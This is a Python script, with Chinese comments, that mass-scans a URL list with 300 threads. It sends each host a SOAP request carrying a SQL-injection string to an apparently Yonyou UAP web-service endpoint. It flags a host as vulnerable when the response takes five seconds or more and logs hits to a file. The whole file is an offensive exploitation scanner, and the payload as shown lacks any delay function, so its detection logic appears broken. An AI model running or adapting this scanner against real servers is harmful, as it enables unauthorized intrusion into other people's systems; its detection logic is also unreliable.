import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
import warnings
import sys

# 禁用SSL警告
warnings.filterwarnings('ignore')

# 线程锁
file_lock = threading.Lock()
print_lock = threading.Lock()

# SOAP请求数据
SOAP_DATA = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imet="http://meta.ae.pubitf.uap/IMetaWebService4BqCloud">
   <soapenv:Header/>
   <soapenv:Body>
      <imet:loadFields>
         <!--type: string-->
         <imet:string>SmartModel^1';*</imet:string>
      </imet:loadFields>
   </soapenv:Body>
</soapenv:Envelope>'''

# 请求头
HEADERS = {
    'Host': '',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cookie': 'JSESSIONID=09133CFE3A7B0CE8341AB1A7DEDFCCDE.server',
    'Connection': 'keep-alive',
    'SOAPAction': 'urn:loadFields',
    'Content-Type': 'text/xml;charset=UTF-8'
}

def check_vulnerability(url):
    """
    检测单个URL是否存在漏洞
    """
    try:
        # 构造完整的请求URL
        parsed_url = urlparse(url)
        if not parsed_url.scheme:
            url = 'http://' + url
            
        target_url = urljoin(url.rstrip('/'), '/uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud')
        
        # 设置Host头
        headers = HEADERS.copy()
        headers['Host'] = urlparse(url).netloc
        
        # 记录开始时间
        start_time = time.time()
        
        # 发送POST请求，禁用SSL验证，禁用重定向
        response = requests.post(
            target_url,
            data=SOAP_DATA,
            headers=headers,
            verify=False,
            timeout=15,
            allow_redirects=False  # 禁止重定向
        )
        
        # 计算响应时间
        response_time = time.time() - start_time
        
        status_code = response.status_code
        
        # 判断漏洞条件
        if status_code == 200 and response_time >= 5:
            # 存在漏洞，立即写入文件
            result = f"存在漏洞 - URL: {url}, 响应时间: {response_time:.2f}秒, 状态码: {status_code}\n"
            with file_lock:
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(result)
            with print_lock:
                print(f"[+] 存在漏洞 - {url} (响应时间: {response_time:.2f}秒)")
            return True, url, response_time, status_code
            
        elif 300 <= status_code < 400:
            # 3xx状态码，认为不存在漏洞
            with print_lock:
                print(f"[-] 不存在漏洞 - {url} (状态码: {status_code} - 重定向)")
            return False, url, response_time, status_code
            
        else:
            # 其他状态码
            with print_lock:
                print(f"[-] 不存在漏洞 - {url} (状态码: {status_code}, 响应时间: {response_time:.2f}秒)")
            return False, url, response_time, status_code
            
    except requests.exceptions.Timeout:
        with print_lock:
            print(f"[!] 请求超时 - {url}")
        return False, url, 15, 0
        
    except requests.exceptions.ConnectionError:
        with print_lock:
            print(f"[!] 连接失败 - {url}")
        return False, url, 0, 0
        
    except Exception as e:
        with print_lock:
            print(f"[!] 检测出错 - {url}: {str(e)}")
        return False, url, 0, 0

def main():
    """
    主函数
    """
    # 读取URL列表
    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[错误] 未找到url.txt文件")
        return
    except Exception as e:
        print(f"[错误] 读取url.txt文件失败: {str(e)}")
        return
    
    if not urls:
        print("[错误] url.txt文件中没有有效的URL")
        return
    
    print(f"开始检测，共 {len(urls)} 个URL")
    print("=" * 50)
    
    # 清空或创建结果文件
    with open('result.txt', 'w', encoding='utf-8') as f:
        f.write("漏洞检测结果:\n")
        f.write("=" * 50 + "\n")
    
    # 使用ThreadPoolExecutor进行并发检测
    vulnerable_count = 0
    total_count = len(urls)
    
    with ThreadPoolExecutor(max_workers=300) as executor:
        # 提交所有任务
        future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}
        
        # 处理完成的任务
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                result = future.result()
                if result[0]:  # 如果存在漏洞
                    vulnerable_count += 1
            except Exception as e:
                with print_lock:
                    print(f"[!] 任务执行异常 - {url}: {str(e)}")
    
    print("=" * 50)
    print(f"检测完成!")
    print(f"总共检测: {total_count} 个URL")
    print(f"发现漏洞: {vulnerable_count} 个")
    print(f"结果已保存到 result.txt 文件中")

if __name__ == "__main__":
    # 设置不验证SSL
    requests.packages.urllib3.disable_warnings()
    
    # 设置请求默认超时
    requests.adapters.DEFAULT_RETRIES = 1
    
    main()